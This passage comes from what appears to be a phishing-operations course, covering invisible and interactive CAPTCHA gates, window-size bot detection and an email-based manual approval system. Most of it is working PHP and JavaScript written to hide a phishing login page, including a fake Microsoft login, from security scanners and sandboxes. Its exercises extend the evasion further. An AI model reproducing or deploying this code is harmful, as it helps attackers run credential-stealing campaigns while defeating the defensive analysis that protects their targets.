            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(navigatorData).toString()
    })
    .then(response => response.json())
    .then(data => {
        console.log('Bot Score:', data.botScore);
    })
    .catch(error => console.error('Error:', error));
</script>
</body>
</html>

```

- Blocking cookies to raise our bot score

- Setting a custom user agent again to raise our bot score

- Based off our set criteria, we receive a bot score of 0.75.

#### Making Improvements
The previous code can be further improved to enhance its effectiveness. Several modifications will be made to streamline the process.

First, the PHP and HTML will be combined into a single file, `customCaptcha.php`, to simplify the structure. Instead of using the Fetch API to make a POST request, a form will be submitted with hidden values containing the navigation properties.

Next, an encrypted cookie will be used to store whether the user has passed or failed the CAPTCHA assessment. Once the cookie is set, there will be no need to challenge the user again in the future, as its contents can be decrypted to determine the result.

Before displaying the phishing content, the phishing page (`login.php`) will validate the cookie. If the cookie confirms that the user has passed the CAPTCHA, the phishing content will be displayed. If the cookie is not set, the user will be redirected to `customCaptcha.php` for assessment. Finally, if the cookie indicates that the user has failed the CAPTCHA, they will be redirected to `403.html`.

The diagram below illustrates the complete flow of the CAPTCHA validation process integrated with the phishing page.

#### Setting a Cookie
As mentioned, we will use a cookie to maintain the value of the user's CAPTCHA pass or fail status. This cookie will store an encrypted value indicating the user has passed the CAPTCHA, ensuring verification on subsequent page requests. On the other hand, if the user fails verification, we will add a cookie indicating they did not pass, preventing them from accessing our website.

The `setCaptchaStatusCookie` function will create the encrypted cookie with and set it for the user. The function has the following parameters:

- `$passed` - This is a boolean value indicating whether the user passed or failed the CAPTCHA.

- `$encryptionKey` - This is the encryption key that's used to encrypt the cookie value.

- `$cookie_name` - This is the name of the cookie. The default value is set to `captcha_token`.

- `$expiration` - This is the cookie's expiry date in seconds. The default value is set to `604800`.

```
function setCaptchaStatusCookie($passed, $encryptionKey, $cookie_name = "captcha_token", $expiration = 604800) {
    $status = $passed ? "true" : "false";
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted_value = openssl_encrypt($status, 'aes-256-cbc', $encryptionKey, 0, $iv);

    $cookie_value = base64_encode($encrypted_value . '::' . $iv);

    // Setting cookie name, value, expiration time, path, domain, and secure & HttpOnly flags
    setcookie($cookie_name, $cookie_value, time() + $expiration, "/", "", false, true);
}

```
Additionally, a function will be created to decrypt the CAPTCHA cookie and retrieve the value. The `decryptCaptchaCookie` has the following parameters:

- `$encrypted_value` - This is the encrypted value of the CAPTCHA cookie. For example, if using the default `captcha_token` cookie name, we can retrieve the value using `$_COOKIE['captcha_token']`.

- `$encryptionKey` - This is the encryption key that's used to decrypt the cookie value.

```
function decryptCaptchaCookie($encrypted_value, $encryptionKey) {
    list($encrypted_data, $iv) = explode('::', base64_decode($encrypted_value), 2);
    return openssl_decrypt($encrypted_data, 'aes-256-cbc', $encryptionKey, 0, $iv);
}

```

#### Complete Code - Updated
The complete updated `customCaptcha.php` file is shown below.

```
<?php
function decryptCaptchaCookie($encrypted_value, $key) {
    list($encrypted_data, $iv) = explode('::', base64_decode($encrypted_value), 2);
    return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    //////////////////// Cookie Validation Start ////////////////////
    $encryptionKey = "ThisisaverycomplexkeythatcAnnotbeguessed!"; // Key will be used to encrypt/decrypt the cookie
    if (isset($_COOKIE['captcha_token'])) {
        $decrypted_value = decryptCaptchaCookie($_COOKIE['captcha_token'], $encryptionKey);

        if ($decrypted_value === "true") {
            header('Location: /login.php');
            exit;
        } elseif ($decrypted_value === "false") {
            header('Location: /403.html');
            exit;
        }
    }
    //////////////////// Cookie Validation End ////////////////////

    // Global bot score variable
    // We start the bot score at 0
    // Meaning, we assume everyone is a user by default
    // We can increase this (e.g. 0.25, 0.50 etc.) but we may block users more often
    $botScore = 0;

    function analyzeIpAddress($ipAddress) {
        global $botScore; // Access the global variable
        $scoreAdjustment = 0;

        $apiToken = '123456789';
        $apiUrl = "https://ipinfo.io/{$ipAddress}?token={$apiToken}";
        $response = file_get_contents($apiUrl);
        $locationData = json_decode($response, true);

        if (isset($locationData['privacy']) && $locationData['privacy']['hosting']) {
            $scoreAdjustment = 0.25;
        }

        else if (isset($locationData['privacy']) && $locationData['privacy']['vpn']) {
            $scoreAdjustment = 0.10; // Reduce score adjusted because it may be a corporate VPN
        }

        $botScore += $scoreAdjustment;
    }

    function analyzeUserAgent($userAgent) {
        global $botScore;
        $scoreAdjustment = 0;

        // Based off hypothetical intel, we know our target users only use Chrome or MS Edge
        // Only whitelisting these two keywords
        $whitelistedKeywords = array('Chrome', 'Edg');
        $isWhitelisted = false;

        foreach ($whitelistedKeywords as $keyword) {
            if (strpos($userAgent, $keyword) !== false) {
                $isWhitelisted = true;
                break;
            }
        }

        if (!$isWhitelisted) {
            $scoreAdjustment = 0.50;
        }

        $botScore += $scoreAdjustment;
    }

    function analyzeNavigatorProperties($navigatorWebDriver, $navigatorCookieEnabled, $navigatorHwConcurrency) {
        global $botScore;
        $scoreAdjustment = 0;

        if ($navigatorWebDriver) {
            $scoreAdjustment += 1;
        }

        if (!$navigatorCookieEnabled) {
            $scoreAdjustment += 0.25;
        }

        // False positives can occur, so lowering the adjustment score
        if ($navigatorHwConcurrency <= 2) {
            $scoreAdjustment += 0.10;
        }

        $botScore += $scoreAdjustment;
    }

    function setCaptchaStatusCookie($passed, $encryptionKey, $cookie_name = "captcha_token", $expiration = 604800) {
        $status = $passed ? "true" : "false";
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
        $encrypted_value = openssl_encrypt($status, 'aes-256-cbc', $encryptionKey, 0, $iv);

        $cookie_value = base64_encode($encrypted_value . '::' . $iv);

        // Setting cookie name, value, expiration time, path, domain, and secure & HttpOnly flags
        setcookie($cookie_name, $cookie_value, time() + $expiration, "/", "", false, true);
    }

    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $navigatorWebDriver = filter_var($_POST['webdriver'], FILTER_VALIDATE_BOOLEAN);
    $navigatorCookieEnabled = filter_var($_POST['cookieEnabled'], FILTER_VALIDATE_BOOLEAN);
    $navigatorHwConcurrency = intval($_POST['hardwareConcurrency']);

    // Analyzing the user
    analyzeIpAddress($ipAddress);
    analyzeUserAgent($userAgent);
    analyzeNavigatorProperties($navigatorWebDriver, $navigatorCookieEnabled, $navigatorHwConcurrency);

    // If the bot score is greater than 1, default it to 1 since that's our upper limit.
    if($botScore > 1){
        $botScore = 1;
    }

    if ($botScore >= 0.75) {
        setCaptchaStatusCookie(false, $encryptionKey);
        header('Location: /403.html');
        exit;
    } else {
        setCaptchaStatusCookie(true, $encryptionKey);
        header('Location: /login.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-store" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
<title>Security Check</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: white;
        color: black;
        margin: 0;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
    }
    .container {
        text-align: center;
        border: 1px solid #ccc;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h1 {
        margin: 0;
        font-size: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .icon {
        height: 30px;
        margin-right: 10px;
    }
    .browser-check {
        margin: 20px 0;
        position: relative;
        height: 50px;
    }
    .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-radius: 50%;
        border-top: 4px solid #333;
        width: 36px;
        height: 36px;
        animation: spin 2s linear infinite;
        position: absolute;
        top: 50%;
        left: 50%;
        margin: -18px 0 0 -18px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .privacy {
        font-size: 14px;
        color: #777;
    }
</style>
<script>
</script>
</head>
<body>
<div class="container">
    <h1>Checking your browser</h1>
    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <div class="browser-check">
        <div class="spinner" id="spinner"></div>
    </div>
    <form id="captchaForm" action="customCaptcha.php" method="POST" style="display: none;">
        <input type="hidden" name="webdriver" id="webdriver">
        <input type="hidden" name="cookieEnabled" id="cookieEnabled">
        <input type="hidden" name="hardwareConcurrency" id="hardwareConcurrency">
    </form>
</div>
<script>
    document.getElementById('webdriver').value = navigator.webdriver;
    document.getElementById('cookieEnabled').value = navigator.cookieEnabled;
    document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency;

    // Slight delay before submitting form
    setTimeout(function() {
        document.getElementById('captchaForm').submit();
    }, 1000);
</script>
</body>
</html>

```
For our phishing page, `login.php`, additional code needs to be added to verify the CAPTCHA cookie before granting access. If the cookie is not set, the user should be redirected to `customCaptcha.php` for assessment. Additionally, if the CAPTCHA cookie shows that the user failed the assessment, they should be redirected to `403.html`.

```
<?php
//////////////////// Cookie Validation Start ////////////////////
function decryptCaptchaCookie($encrypted_value, $key) {
    list($encrypted_data, $iv) = explode('::', base64_decode($encrypted_value), 2);
    return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
}

$encryptionKey = "ThisisaverycomplexkeythatcAnnotbeguessed!"; // Key used to encrypt/decrypt the cookie
if (isset($_COOKIE['captcha_token'])) {
    $decrypted_value = decryptCaptchaCookie($_COOKIE['captcha_token'], $encryptionKey);

    if ($decrypted_value === "false") {
	header('Location: /403.html');
        exit;
    }
} else { // If there's no cookie set, redirect to recaptcha page
	header('Location: /customCaptcha.php');
	exit;
}
//////////////////// Cookie Validation End ////////////////////

// If the cookie is valid, the phishing content below will be displayed
// ..
// ..
// ..
// Rest of phishing page
?>

```
The video can be found in folder: `./videos/updated-demo.mp4`

### Interactive CAPTCHA
Interactive CAPTCHA is the traditional method that requires the user to solve a challenge to prove they are not a bot. In this example, we create a simple mathematical equation involving addition that the user must solve to prove they are human. This requires us to generate two random numbers, add them, and save the result. The result should not be stored anywhere in the frontend to prevent tampering or manipulation.

The code below creates a session with the name `MALDEVSESS`, starts the session, and implements a challenge where the user must solve a basic math problem. The solution to the problem is stored in the session variable `$_SESSION['expected_result']`. The user's response is retrieved from the `$_POST['answer']`, and then compared to the session-stored answer. If the answer is correct, we redirect to `login.php` otherwise we redirect to `403.html`.

```
<?php
session_name('MALDEVSESS');

session_start();

function interactiveChallenge() {
    $number1 = rand(1, 10);
    $number2 = rand(1, 10);
    
    // Store the result in the session
    $_SESSION['expected_result'] = $number1 + $number2;

    return [$number1, $number2];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userAnswer = intval($_POST['answer']);
    if ($userAnswer === $_SESSION['expected_result']) {
        header('Location: /login.php');
        exit;
    } else {
        header('Location: /403.html');
        exit;
    }
    exit;
}

// Generate the challenge
list($number1, $number2) = interactiveChallenge();
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: white;
        color: black;
        margin: 0;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
    }
    .container {
        text-align: center;
        border: 1px solid #ccc;
        padding: 40px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
        width: 300px;
    }
    h1 {
        margin: 20px 0;
        font-size: 24px;
    }
    input, button {
        margin-top: 10px;
        font-size: 16px;
        padding: 10px;
        width: 100%;
        box-sizing: border-box;
    }
</style>
<script>
    function displayChallenge(num1, num2) {
        document.getElementById('challenge').textContent = `Please solve the following to prove you are human: ${num1} + ${num2}`;
    }
</script>
</head>
<body onload="displayChallenge(<?php echo $number1; ?>, <?php echo $number2; ?>)">
<div class="container">
    <svg width="100px" height="100px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" stroke-width="3" stroke="#000000" fill="none">
        <path d="M31.74,7.19,13.36,14.85a1,1,0,0,0-.62.93V32.11h0A22.89,22.89,0,0,0,23.93,51.78l8.18,4.86,8.06-4.85a22.87,22.87,0,0,0,11.09-19.6V14.84a1,1,0,0,0-.65-.94L32.48,7.18A1,1,0,0,0,31.74,7.19Z"/>
        <polyline points="22.01 33.5 29.44 39.12 42.56 20.69"/>
    </svg>
    <h1>Let's do a quick security check</h1>
    <form method="POST" action="index2.php">
        <div id="challenge" class="browser-check"></div>
        <input type="text" id="userAnswer" name="answer" placeholder="Answer" />
        <button type="submit">Submit</button>
    </form>
</div>
</body>
</html>

```

#### Setting a Session
In the previous implementation of the invisible CAPTCHA, the results of the CAPTCHA were stored in an encrypted cookie. Although storing the results in the encrypted cookie provided us with the expected results, it was unnecessarily complex. A simpler and more effective approach is to store the CAPTCHA results on the server side using sessions. For example:

```
$_SESSION['captcha_token'] = 'passed'; // Stores the "passed" value in captcha_token
// Redirect to login.php

// or

$_SESSION['captcha_token'] = 'failed'; // Stores the "failed" value in captcha_token
// Redirect to 403.html

```
Storing the result in a session eliminates the need to manage cookies on the client side and prevents the cached CAPTCHA page from being viewed if the back button is clicked. Additionally, a session check should be added at the beginning of the page to determine if the session already exists. This check validates the session and redirects users accordingly, preventing them from re-doing the CAPTCHA multiple times. An example of performing the session check is shown below.

```
if (isset($_SESSION['captcha_token'])) {
    if ($_SESSION['captcha_token'] === 'passed') {
        header('Location: /login.php');
        exit;
    } elseif ($_SESSION['captcha_token'] === 'failed') {
        header('Location: /403.html');
        exit;
    }
}

```
The complete and updated code is shown below, which includes the session check

```
<?php
session_name('MALDEVSESS');
session_start();

function interactiveChallenge() {
    $number1 = rand(1, 10);
    $number2 = rand(1, 10);
    
    // Store the result in the session
    $_SESSION['expected_result'] = $number1 + $number2;

    return [$number1, $number2];
}

// Check if the verification result is already set in the session
if (isset($_SESSION['captcha_token'])) {
    if ($_SESSION['captcha_token'] === 'passed') {
        header('Location: /login.php');
        exit;
    } elseif ($_SESSION['captcha_token'] === 'failed') {
        header('Location: /403.html');
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userAnswer = intval($_POST['answer']);
    if ($userAnswer === $_SESSION['expected_result']) {
        $_SESSION['captcha_token'] = 'passed';
        header('Location: /login.php');
        exit;
    } else {
        $_SESSION['captcha_token'] = 'failed';
        header('Location: /403.html');
        exit;
    }
}

// Generate the challenge
list($number1, $number2) = interactiveChallenge();
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: white;
        color: black;
        margin: 0;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
    }
    .container {
        text-align: center;
        border: 1px solid #ccc;
        padding: 40px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
        width: 300px;
    }
    h1 {
        margin: 20px 0;
        font-size: 24px;
    }
    input, button {
        margin-top: 10px;
        font-size: 16px;
        padding: 10px;
        width: 100%;
        box-sizing: border-box;
    }
</style>
<script>
    function displayChallenge(num1, num2) {
        document.getElementById('challenge').textContent = `Please solve the following to prove you are human: ${num1} + ${num2}`;
    }
</script>
</head>
<body onload="displayChallenge(<?php echo $number1; ?>, <?php echo $number2; ?>)">
<div class="container">
    <svg width="100px" height="100px" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" stroke-width="3" stroke="#000000" fill="none">
        <path d="M31.74,7.19,13.36,14.85a1,1,0,0,0-.62.93V32.11h0A22.89,22.89,0,0,0,23.93,51.78l8.18,4.86,8.06-4.85a22.87,22.87,0,0,0,11.09-19.6V14.84a1,1,0,0,0-.65-.94L32.48,7.18A1,1,0,0,0,31.74,7.19Z"/>
        <polyline points="22.01 33.5 29.44 39.12 42.56 20.69"/>
    </svg>
    <h1>Let's do a quick security check</h1>
    <form method="POST" action="index2.php">
        <div id="challenge" class="browser-check"></div>
        <input type="text" id="userAnswer" name="answer" placeholder="Enter your answer here" />
        <button type="submit">Submit</button>
    </form>
</div>
</body>
</html>

```
The video below shows the code working as expected and preventing the back button from taking us back to the CAPTCHA page.

The video can be found in folder: `./videos/interactive-demo.mov`

## Conclusão
CAPTCHAs are a powerful tool for preventing security scanners and other bots from crawling and analyzing phishing websites. However, it's essential to strike the right balance between creating a challenging CAPTCHA and maintaining a positive user experience, to avoid deterring legitimate users. Keep in mind that CAPTCHAs will not block all automated analysis. Some advanced sandboxes, such as ANY.RUN, allow users to manually solve a CAPTCHA, enabling the automated analysis to proceed as usual.

## Objetivos
Combine the invisible and interactive CAPTCHA techniques. If a user falls between 0.50 and 0.75, show an interactive CAPTCHA

Create a cookie or a session that prevents the user from re-doing the CAPTCHA after 3 attempts

Create a more complex interactive CAPTCHA


---

# Módulo 53 — Anti-Bot Via Tamanho de Janela Impróprio

Módulo 53 — Anti-Bot Via Improper Window Size

- # Módulo 53 — Anti-Bot Via Tamanho de Janela Impróprio

# Disclaimer

## Introdução
Another technique we can use to determine if the client is an automated scanner is to analyze the window sizes which we can find through the Window interface. Specifically, the properties we are interested in are the following:
window.innerWidth - Represents the interior width of the browser window, including the webpage content but excluding browser elements (i.e. toolbars, tabs, etc.) and scrollbars.

- window.innerHeight - Represents the interior height of the browser window, accounting for the webpage content but excluding browser elements and scrollbars.

- window.outerWidth - Measures the entire width of the browser window, including browser elements and any visible interface elements like toolbars and scrollbars.

- window.outerHeight - Measures the entire height of the browser window, including browser elements and any other interface elements.

- devicePixelRatio - Represents the ratio of physical pixels on the device to device-independent pixels in the browser. A value of 1 indicates a standard 1:1 mapping, typical for non-retina displays. Values below 1 occur when the user zooms out, such as using `Ctrl + -`.

By evaluating these measurements, we can identify unusual window dimensions that may indicate automated behavior.

## Detecção de Full-Screen
The first unusual sign to look out for is when the outer window dimensions match the inner window dimensions. This scenario typically indicates that the browser is in full-screen mode. However, it's important to note that even when the browser is set to full screen, the dimensions may not match exactly due to browser-specific behaviors which can result in slight discrepancies, such as invisible borders or padding reserved for interface interactions. For bot detection, however, the client should usually never have matching outer and inner window dimensions.

The JavaScript code below checks if the outer width and height are equal to the inner width and height.

```
function checkWindowSize() {
    var innerWidth = window.innerWidth;
    var innerHeight = window.innerHeight;
    var outerWidth = window.outerWidth;
    var outerHeight = window.outerHeight;

    document.write('Inner Width: ' + innerWidth + '<br>');
    document.write('Inner Height: ' + innerHeight + '<br>');
    document.write('Outer Width: ' + outerWidth + '<br>');
    document.write('Outer Height: ' + outerHeight + '<br>');

    if (outerWidth === innerWidth && outerHeight === innerHeight) {
        document.write('<strong>User is likely a bot.</strong>');
    } else {
        document.write('<strong>User is likely human.</strong>');
    }
}

checkWindowSize();

```

### Improving Full-Screen Detection
To enhance full screen mode detection, a tolerance variable is introduced in the JavaScript function. This variable, set at 20 pixels, accommodates slight discrepancies between the inner and outer dimensions of the browser window. By allowing a small margin for differences, the function can more reliably detect full-screen mode even when the dimensions aren't perfectly aligned.

```
function checkWindowSizeImproved() {
    var innerWidth = window.innerWidth;
    var innerHeight = window.innerHeight;
    var outerWidth = window.outerWidth;
    var outerHeight = window.outerHeight;
    var tolerance = 20;

    document.write('Inner Width: ' + innerWidth + '<br>');
    document.write('Inner Height: ' + innerHeight + '<br>');
    document.write('Outer Width: ' + outerWidth + '<br>');
    document.write('Outer Height: ' + outerHeight + '<br>');

    if (Math.abs(outerWidth - innerWidth) <= tolerance && Math.abs(outerHeight - innerHeight) <= tolerance) {
        document.write('<strong>User is likely a bot.</strong>');
    } else {
        document.write('<strong>User is likely human.</strong>');
    }
}

checkWindowSizeImproved();

```

### Demo
In the demo below, the first page verifies whether the outer and inner dimensions match exactly which fails in full-screen mode. On the next page, a tolerance of 20px is introduced, allowing the script to accurately determine that the user is in full-screen mode, which is indicated with the message "User is likely a bot."

The video can be found in folder: `./videos/demo-window-size.mp4`

## Dimensões de Janela Impossíveis
Another indicator suggesting that the client may be an automated bot is the presence of unrealistic screen dimension configurations. For example, the outer window dimensions, which represent the overall browser window size, should always be larger than the inner window dimensions, which reflect the visible content area excluding interface elements like scrollbars and toolbars. A mismatch where the inner dimensions exceed the outer dimensions is generally impossible under normal browser behavior. The only exception occurs when the user has zoomed out using `Ctrl + -`, which reduces the `devicePixelRatio` to a value less than 1, causing the inner dimensions to appear larger relative to the outer dimensions.

The JavaScript code snippet below demonstrates a method to detect anomalies in window dimensions that might indicate bot activity. The script retrieves and compares `window.innerWidth` and `window.innerHeight` with `window.outerWidth` and `window.outerHeight`, while also factoring in the `devicePixelRatio` to account for high-definition displays or scaling factors.

If the inner dimensions exceed the scaled outer dimensions (adjusted by the `devicePixelRatio`) and the `devicePixelRatio` is greater than or equal to 1, the client is flagged as likely being a bot. Otherwise, the client is considered a human user.

```
function impossibleWindowSizeDetection() {
    var innerWidth = window.innerWidth;
    var innerHeight = window.innerHeight;
    var outerWidth = window.outerWidth;
    var outerHeight = window.outerHeight;
    var devicePixelRatio = window.devicePixelRatio;

    document.write('Inner Width: ' + innerWidth + '<br>');
    document.write('Inner Height: ' + innerHeight + '<br>');
    document.write('Outer Width: ' + outerWidth + '<br>');
    document.write('Outer Height: ' + outerHeight + '<br>');
    document.write('Device Pixel Ratio: ' + devicePixelRatio + '<br>');

    if ((innerWidth > outerWidth * devicePixelRatio || innerHeight > outerHeight * devicePixelRatio) && devicePixelRatio >= 1) {
        document.write('<strong>User is likely a bot.</strong>');
    } else {
        document.write('<strong>User is likely human.</strong>');
    }
}

impossibleWindowSizeDetection();

```

### Demo
In the demo below, zooming in and out alters the screen dimensions, resulting in the inner dimensions exceeding the outer dimensions. Nevertheless, the user is still identified as human because the `devicePixelRatio` adjusts appropriately to reflect the zoom level.

The video can be found in folder: `./videos/device-pixel.mov`

## Threshold de Dimensões Externas
In certain cases, automated bots may run a minimized browser window that result in an unusually small outer window dimension significantly below what would be realistic for standard browsing behavior. Detecting such anomalies by checking for dimensions below a certain threshold can help identify bot activity and differentiate it from legitimate users.

In the script below, we set the minimum threshold to be `100px` for both the outer width and height. If the client has outer window dimensions of 100px or less, we assume the user is a bot.

```
function outerWindowSize() {
    var outerWidth = window.outerWidth;
    var outerHeight = window.outerHeight;
    var minWidthThreshold = 100;
    var minHeightThreshold = 100;

    if (outerWidth <= minWidthThreshold || outerHeight <= minHeightThreshold) {
        document.write('<strong>User is likely a bot.</strong>');
    }
}

outerWindowSize();

```

## Conclusão
Just as the `navigator` object provided valuable client-related information in previous modules, the `window` object offers additional insights into the user's browser environment. By analyzing properties like window dimensions and behaviors, we can enhance our ability to distinguish between automated bots and legitimate users, adding another layer of anti-analysis and bot detection.

## Leitura Complementar

- The Great @Mrgretzky

## Objetivos
In addition to HTTP headers, send client-side telemetry (e.g. navigator properties) to make a more informed decision before accepting or rejecting a client

If a user is rejected once, log their IP address and permanently serve them an HTTP 403 page

Automatically block clients that are definitively identified as bots


---

# Module 54 - Anti-Analysis Approve Access Via Email

Módulo 54 — Anti-Analysis Approve Access Via Email

- # Module 54 - Anti-Analysis Approve Access Via Email

# Disclaimer
# Módulo 54 — Anti-Análise: Aprovação de Acesso Via Email

## Introdução
Upon launching the phishing campaign, we may want to manually review the requests hitting our website and manually approve or deny access. If a user is approved, they would see the phishing content, otherwise they would be redirected away or shown benign content. The main advantage of this technique is that we manually approve every user accessing our website based on the provided information in their HTTP request (e.g. User agent, referrer, etc.). However, depending on how big the phishing campaign is, this technique can be overwhelming if large amounts of traffic occur but this can be mitigated by having fail-safe behavior meaning if we don't approve or deny within X seconds, a certain action is automatically taken.This module will demonstrate how to send an email with information about the HTTP request and provide a link to approve or deny the request to see the phishing content.
## Pré-requisitos
Before proceeding to sending emails we need the following prerequisites completed. First, `composer` needs to be installed on the server using the following command.
```
sudo apt install composer

```
Next, we need to traverse to the directory that will have our PHP script that will send out the emails (e.g. `cd /var/www/html/approve-access`) and install the PHPMailer library. This library will be used to interact with SMTP and send out emails.
```
composer require phpmailer/phpmailer

```
Another requirement is an email address that will be used to send and receive emails. It's important to select an emailing provider that has an API with a lenient rate limit to avoid interruptions. In this module, we will use a Gmail account to send and receive the emails. Gmail requires us to enable multifactor authentication prior to using their App Passwords functionality which is needed to send emails via the Gmail API.Head to myaccount.google.com/security and enable "2-Step Verification".Once enabled, head to myaccount.google.com/apppasswords and create an app name. Once an app is created, Google will generate a password that should be saved as it will be used in our upcoming PHP script.
## Visão Geral da Implementação
With the prerequisites satisfied, we move on to the implementation of the email approval system. The implementation shown in the module will be as follows:
When a user attempts to access our phishing website, an email is sent to us that contains the URL, the associated HTTP headers, and two links to either approve or deny access.

- The email is sent using the `PHPMailer` library, and it contains the unique token for the user session, embedded in both the approval and denial links.

- The user is kept on a waiting page while the system awaits an approval or denial decision.

- Clicking the approval or denial link sends the token back to the server, where the decision is stored in a user-specific file located outside the document root. The file will be named in the format `decision_$token.txt`.

- Once the decision is made and the unique file is generated, the file is read and then deleted.

- If approval was given, the user is shown the phishing content stored in `/var/www/ms-login.html`. Otherwise, if the user was denied they will be shown `/var/www/403.html`.

- If no action is taken, the user remains on the waiting page, with the system polling for an action until a decision is made or until the page times out.

### Página de Landing
To start, we will create a landing page designed to be sent to the target user. This landing page will serve as the entry point for the session management process, beginning by establishing a session variable named `access_token`. A unique token will be generated for each session, ensuring tracking and identification.

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'vendor/autoload.php';

session_name("access_token");
session_start();

// Create a unique token
if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

$token = $_SESSION['token'];

// ...
// ...

```
Once the token is created, an email will be dispatched containing the following elements: the URL of the landing page along with any query parameters, the HTTP headers, and the approval and denial links. The approval and denial links will correspond to `approve.php` and `decline.php`, respectively. The unique token generated for the session will be appended to these links as a query parameter, allowing the system to process the decision for the user associated with the token.

The `$URI_PATH` path must be set to the correct domain and path.

```
<?php
// ...
// ...
// Emailing ourselves the request information
$mail = new PHPMailer(true);
try {
    $EMAIL_ADDRESS = 'user@gmail.com'; // Replace with your Gmail account

    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = $EMAIL_ADDRESS;
    $mail->Password   = '1234 5678 4321 1234'; // Replace with your app password
    $mail->SMTPSecure = 'tls';
    $mail->Port       = 587;

    $mail->setFrom($EMAIL_ADDRESS, 'Maldev');
    $mail->addAddress($EMAIL_ADDRESS, 'Maldev');

    $mail->isHTML(true);
    $mail->Subject = 'New Visitor';

    // Get all the HTTP headers
    $headers = '';
    foreach (getallheaders() as $name => $value) {
        $headers .= "$name: $value\n";
    }

    // Get the URL with query parameters
    $url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

    // Prepare the approval and denial links
    $URI_PATH = 'https://example.com/approve-access/'; // Replace with the full path to your approve and decline files
    $approveLink = $URI_PATH . 'approve.php?token=' . $token;
    $declineLink = $URI_PATH . 'decline.php?token=' . $token;

    // Add the information to the body of the email and send the email
    $mail->Body = nl2br($url . "\n\n" . $headers . "\n\nApprove: <a href=\"$approveLink\">Approve</a>\nDecline: <a href=\"$declineLink\">Decline</a>");
    $mail->send();

} catch (Exception $e) {
exit();
}
?>
// ...
// ...

```
To ensure a smooth user experience, an HTML/CSS-based spinner is implemented on the landing page. This visual element will give the user the impression that the page is actively loading, enhancing the interaction flow while the session and token processing occur in the background. And the final element of the landing page involves utilizing the Fetch API to repeatedly poll `check_approval.php` to determine if a decision has been made.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waiting for Approval</title>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="spinner"></div>

<script>
    function checkDecision() {
        fetch('check_approval.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'approved' || data.status === 'declined') {
                    document.body.innerHTML = data.content;
                } else {
                    setTimeout(checkDecision, 2000);
                }
            });
    }

    checkDecision();
</script>

</body>
</html>

```
The complete code for the landing page is shown below.

landing.php

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'vendor/autoload.php';

session_name("access_token");
session_start();

// Create a unique token
if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

$token = $_SESSION['token'];

// Emailing ourselves the request information
$mail = new PHPMailer(true);
try {
    $EMAIL_ADDRESS = 'user@gmail.com'; // Replace with your Gmail account

    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = $EMAIL_ADDRESS;
    $mail->Password   = '1234 5678 4321 1234'; // Replace with your app password
    $mail->SMTPSecure = 'tls';
    $mail->Port       = 587;

    $mail->setFrom($EMAIL_ADDRESS, 'Maldev');
    $mail->addAddress($EMAIL_ADDRESS, 'Maldev');

    $mail->isHTML(true);
    $mail->Subject = 'New Visitor';

    // Get all the HTTP headers
    $headers = '';
    foreach (getallheaders() as $name => $value) {
        $headers .= "$name: $value\n";
    }

    // Get the URL with query parameters
    $url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

    // Prepare the approval and denial links
